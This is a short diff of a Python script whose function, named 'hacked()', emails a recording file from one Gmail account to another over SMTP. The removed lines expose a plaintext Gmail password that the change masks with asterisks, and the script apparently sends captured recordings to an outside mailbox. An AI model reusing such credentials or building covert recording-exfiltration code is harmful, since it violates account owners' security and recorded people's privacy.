@@ -10,7 +10,7 @@ def hacked():
 
     fromaddr = "imvickykumar999@gmail.com"
     toaddr = "hellovickykumar123@gmail.com"
-    filename = 'recording.mp4'
+    filename = 'recording.mp3'
 
     msg = MIMEMultipart()
     msg['From'] = fromaddr
@@ -33,7 +33,7 @@ def hacked():
     s = smtplib.SMTP('smtp.gmail.com', 587)
     s.starttls()
     try:
-        s.login(fromaddr, "@Hey_Vicks")
+        s.login(fromaddr, "*******")
         print('Mailed')
     except Exception as e:
         print(e)
